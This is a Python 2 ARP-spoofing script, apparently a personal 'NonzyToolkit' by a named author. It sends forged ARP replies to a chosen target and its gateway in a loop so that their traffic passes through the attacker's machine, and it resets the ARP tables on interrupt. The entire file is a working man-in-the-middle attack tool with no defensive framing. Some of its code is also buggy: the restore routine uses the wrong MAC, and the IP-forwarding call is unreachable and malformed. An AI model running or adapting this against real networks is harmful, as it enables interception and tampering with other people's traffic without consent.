#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess
import pyfiglet 
from termcolor import colored

#banner-text
banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print(" Written By Iwundu Chinonso")
print colored("=" * 60, "green")

try:
	#function to parse on terminal.....
	def get_arguments():
		parser = optparse.OptionParser("Usage: arp-spoofer.py -t <target ip> -g < gate p>")
		parser.add_option("-t", "--target_ip", dest="target", help="Target IP") 
		parser.add_option("-g", "--gateway", dest="gateway", help="Gateway")
		(options, arguments) = parser.parse_args()
		
		if not options.target:
			parser.error("An IP Address is reqiured")	
		if not options.gateway:
			parser.error("A Gateway IP is required")	
		return options

	#function to get MAC Address...
	def get_mac(ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
		return response[0][1].hwsrc

	#function to spoof arp request...
	def spoof(target_ip, spoof_ip):
		target_mac = get_mac(target_ip)
		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)

	#function to restore ARP Table of targets...
	def restore(destination_ip, source_ip):
		source_mac = get_mac(destination_ip)
		destination_mac = get_mac(destination_ip) 
		packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
		scapy.send(packet, count=4, verbose=False)

	(options) = get_arguments()
	target_ip = options.target
	gateway = options.gateway
	
	#handling exception.....	
	try:
		sent_packet_count = 0
		while True:
			spoof(gateway, target_ip)
			spoof(target_ip, gateway)
			sent_packet_count = sent_packet_count + 2
			print colored("\r[+] Packets Sent: " + str(sent_packet_count), "green"),
			sys.stdout.flush()
			time.sleep(2)
	except KeyboardInterrupt:
		restore(target_ip, gateway)
		restore(gateway, target_ip)
		print colored("\n[-]Resetting ARP Table......\n", "yellow")

except IndexError:
	pass
	
	#enable port forwarding
	forward_connection = "echo 1> /proc/sys/net/ipv4/ip_forward"
	subprocess.call([forward_connection])
	
	